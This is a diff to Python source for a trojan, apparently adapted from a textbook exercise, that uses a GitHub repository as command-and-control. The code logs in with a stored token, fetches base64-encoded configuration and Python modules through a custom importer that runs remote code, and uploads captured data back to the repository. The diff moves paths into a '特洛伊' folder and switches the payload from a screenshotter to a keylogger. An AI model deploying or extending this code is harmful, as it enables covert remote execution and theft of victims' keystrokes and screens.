@@ -17,7 +17,7 @@ import github3  # 用于GitHub API操作
 
 # 读取token，连接到GitHub，创建一个session连接
 def github_connect():
-    with open('mytoken.txt') as fp:
+    with open('../mytoken.txt') as fp:
         token = fp.read()  # 读取存储在文件中的GitHub token
     user = 'shinianyunyan'  # GitHub用户名
     sess = github3.login(token=token)  # 使用token登录GitHub，创建session
@@ -34,12 +34,12 @@ class Trojan:
     def __init__(self, id):
         self.id = id  # 木马ID
         self.config_file = f'{id}.json'  # 配置文件路径
-        self.data_path = f'data/{id}/'  # 数据存储路径
+        self.data_path = f'特洛伊/data/{id}/'  # 数据存储路径
         self.repo = github_connect()  # 连接到GitHub仓库
 
     # 从仓库中读取和解码远程配置文件
     def get_config(self):
-        config_json = get_file_contents('config', self.config_file, self.repo)  # 读取配置文件内容
+        config_json = get_file_contents('特洛伊/config', self.config_file, self.repo)  # 读取配置文件内容
         config = json.loads(base64.b64decode(config_json))  # 解码并解析JSON配置文件
 
         # 检查指定的模块是否已经在当前环境中导入
@@ -57,7 +57,7 @@ class Trojan:
     # 创建一个名为当前时间的文件，并将模块输出结果保存到文件中，上传至仓库中
     def store_module_result(self, data):
         message = datetime.now().isoformat()  # 使用当前时间作为文件名
-        remote_path = f'data/{self.id}/{message}.data'  # 生成远程路径
+        remote_path = f'特洛伊/data/{self.id}/{message}.data'  # 生成远程路径
         bindata = bytes('%r' % data, 'utf-8')  # 将结果转换为字节
         self.repo.create_file(remote_path, message, base64.b64encode(bindata))  # 创建文件并上传到GitHub
 
@@ -83,9 +83,8 @@ class GitImporter:
 
     def find_module(self, name, path=None):
         print(f"[*] Attempting to retrieve {name}")  # 尝试获取模块
-        # self.repo = github_connect()
 
-        new_library = get_file_contents('modules', f'{name}.py', self.repo)  # 获取模块代码
+        new_library = get_file_contents('特洛伊/modules', f'{name}.py', self.repo)  # 获取模块代码
         if new_library is not None:
             self.current_module_code = base64.b64decode(new_library)  # 解码模块代码
             return self
@@ -100,5 +99,5 @@ class GitImporter:
 
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())  # 添加自定义模块导入器
-    trojan = Trojan('screenshotter')  # 创建木马对象
+    trojan = Trojan('keylogger')  # 创建木马对象
     trojan.run()  # 运行木马
